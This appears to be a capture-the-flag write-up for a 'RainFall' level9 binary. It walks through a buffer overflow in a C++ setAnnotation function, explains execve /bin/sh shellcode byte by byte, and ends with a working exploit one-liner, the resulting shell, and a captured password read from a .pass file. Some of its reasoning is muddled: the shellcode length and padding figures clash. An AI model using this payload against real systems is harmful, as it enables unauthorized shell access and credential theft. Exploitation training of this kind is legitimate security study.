# Level 9

## First clue
- once logged in as level9 we find again an executable  owned by `bonus0` 
- we try to execute it with or without arguments and nothinh happens

## Analysis
- `(gdb) ìnfo functions` reveals that the binary is written in cpp and there are 5 functions:
```
N::N(int)
N::setAnnotation(char*)
N::operator+(N&)
N::operator-(N&)
main
```
- there is no calls to /bin/sh
- so we need to call the shellcode by ourselves
- If we disas the main function there are 2 lines, and what is between them, that are importat for us because they are the key to uderstand how we can exploit the bufferoverflow to call the shellcode:
- `0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>` => this instruction calls the setAnnotation function, passing it a pointer to a character array (EPc likely denotes a pointer to a character array). The setAnnotation function does strlen the string passed as argument and copy it without bounce chacking into the buffer (using memcpy), as we can see disassemblying the setAnnotation function (`disas 0x804870e`). That means that we can bufferoverflow the return of setAnnotation.
- `0x08048693 <+159>:	call   *%edx`=> This is the crucial instruction where the program makes a call using the value in edx. Since edx was previously loaded with the value pointed to by esp + 0x10, this effectively means the program is making a call to the address stored at esp + 0x10. This is where where we want to store the shellcode.

Between the 2 lines we have these instructios:
- mov 0x10(%esp),%eax: Here, we're accessing the value at esp + 0x10 and moving it into the eax register. Yes, esp + 0x10 is indeed the same as saying 0x10(%esp).

- mov (%eax),%eax: This instruction dereferences the value stored in eax and loads the value it points to back into eax. Essentially, it's loading the content pointed to by esp + 0x10 into eax.

- mov (%eax),%edx: Similar to the previous instruction, this one dereferences the value stored in eax (which is the content pointed to by esp + 0x10) and loads it into the edx register. So, edx now holds the value pointed to by esp + 0x10, which is likely an address.

- mov 0x14(%esp),%eax: This instruction is accessing the value at esp + 0x14 and moving it into eax. It's important to note that esp + 0x14 is likely where the return address from the setAnnotation function call is stored. This value might be needed later.

- mov %eax,0x4(%esp): Here, the value in eax is moved into memory at esp + 0x4. This is likely setting up some arguments for the next function call.

- mov 0x10(%esp),%eax: This instruction loads the value at esp + 0x10 back into eax. It seems redundant since we already did this earlier.

- mov %eax,(%esp): Finally, the value in eax is moved onto the top of the stack (esp). This is likely setting up the argument for the next function call.

**Key points**:
- esp + 0x10 is likely the memory location where the return address from the setAnnotation function call is stored. When setAnnotation finishes executing, control flow will return to the address stored at esp + 0x10.
- setAnnotations is vulnerable to a buffer overflow when calling memcpy. By overflowing the buffer with shellcode, we overwrite the return address (EIP) with the address of our shellcode. When the function returns, it tries to jump to the address stored in EIP, which now points to our shellcode instead of the original return address. This allows us to hijack control flow and execute our shellcode
-  The setAnnotation function takes a pointer to a string (an array of characters terminated by a null character) as its argument. When the function is called, it copies the contents of the provided string to another location in memory, the buffer

- setAnnotation doesn't return a string itself. The function likely returns nothing (void), but it may indirectly "return" the memory address where the string was copied, that is the buffer.

## Finding the offset of %eax
- if we pass `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`to the program it segfault at the moment where the hexadecimal 0x41366441 is registered in eax. (`info register eax`)
- 0x41366441 correspond to `Ad6A` inn little endian, that is position 108

## How to exploit the vulnerability:
- we want to overflow the buffer and overwrite the return address of the function that called setAnnotation, which is the main function in this case.
- we want to  overwrite the return address with the address of the start of the memcpy buffer, where we want to add the shellcode.

## Finding the address of the start of the memcpy buffer
- if we set a breakpoint at the instruction line where the return address of setAnnotation is move to eax we can find the address returned by setAnnotations (the oe we want to write the shellcode to execute in):
```
(gdb) break *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:	0x41414141
```
- x $eax => this tells us both the address contained in the eax register and the value stored at that address
- similarly the main function gets the value at the memory location pointed to by eax (deferenciating it) in the line `0x08048682 <+142>:	mov    (%eax),%edx` obtaining an address (that is the contnt of eax): 0x804a00c
- we need to deferenciate this address a second times to get the real content of it, that we want to be the shellcode
- to access it, assuming that 0x804a00c point to the next memory case in the stack (static then contiguous) we need to add 4 bytes to this address to get the real address of the content,the actual shellcode => 0x804a00c + 4 = 0x804a010


## How to launch shell using hexadecimal instructions
- [Look at this](https://shell-storm.org/shellcode/files/shellcode-827.html)
- so yes this is the string we can use to launch shell: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
- it is a representation of shellcode written in hexadecimal format. Each pair of hexadecimal digits corresponds to a byte in memory
- \x31\xc0: This represents the xor %eax, %eax assembly instruction. It zeros out the %eax register.
-going furher in details: 
    - \x31: This byte corresponds to the opcode of the "xor" instruction in x86 assembly language. Specifically, it indicates the "xor" instruction with a register as the destination operand.
    - \xc0: This byte corresponds to the ModR/M byte, which specifies the registers involved in the instruction. In this case, it indicates that the destination operand is %eax and there is no source operand.
GLOSSARY:
- opcpde: In x86 assembly language, instructions are represented using mnemonics, such as mov, add, sub, etc. When translated into machine code, each mnemonic corresponds to one or more bytes of opcode. The opcode byte(s) appear at the beginning of the machine code representation of the instruction.
- \x50: This represents the push %eax instruction. It pushes the value of %eax (which is now zero) onto the stack.
- [to better understand register memory](https://www.javatpoint.com/register-memory)

- \x68\x2f\x2f\x73\x68: These bytes represent the string /bin//sh in hexadecimal ASCII format. Remember that ASCII characters are represented in hexadecimal with two characters per byte. So, \x68 represents h, \x2f represents /, \x73 represents s, and so on.

- \x68\x2f\x62\x69\x6e: These bytes represent the second part of the /bin//sh string.

- \x89\xe3: This represents the mov %esp, %ebx instruction. It moves the address of the start of the string /bin//sh into the %ebx register.

- \x50: This is another push %eax instruction, pushing a null byte onto the stack.

- \x53: This represents the push %ebx instruction, pushing the address of the string /bin//sh onto the stack.

- \x89\xe1: This represents the mov %esp, %ecx instruction. It moves the address of the stack pointer into the %ecx register.

- \xb0\x0b: This represents the mov $0xb, %al instruction. It sets the %al register to 0xb, which is the syscall number for execve.

- \xcd\x80: This represents the int $0x80 instruction, which triggers the interrupt 0x80, causing the kernel to execute the execve syscall with the parameters set up previously.

- In summary, this shellcode sets up the registers and stack to execute the execve system call, spawning a shell (/bin/sh).

- key pint: Shell code is 28 bytes

## Exploit
- since we need to overflow the buffer, that is 108 bytes long, our payload need to be longer than that:
- the shell code is 28 bytes (\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80)
- the shell address (in little endian \x10\xa0\x04\x08) is 4 bytes
- the buffer address (in little endian \x0c\xa0\04\x08) is 4 bytes
- so we need 108 - (4 + 4 + 28 = 36) = 72 bytes of padding, met's say "A" * 72
- and voila the payload: 
```
python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
```

## Solution 
```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
$ cat /home/user/bonus0/.pass 
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```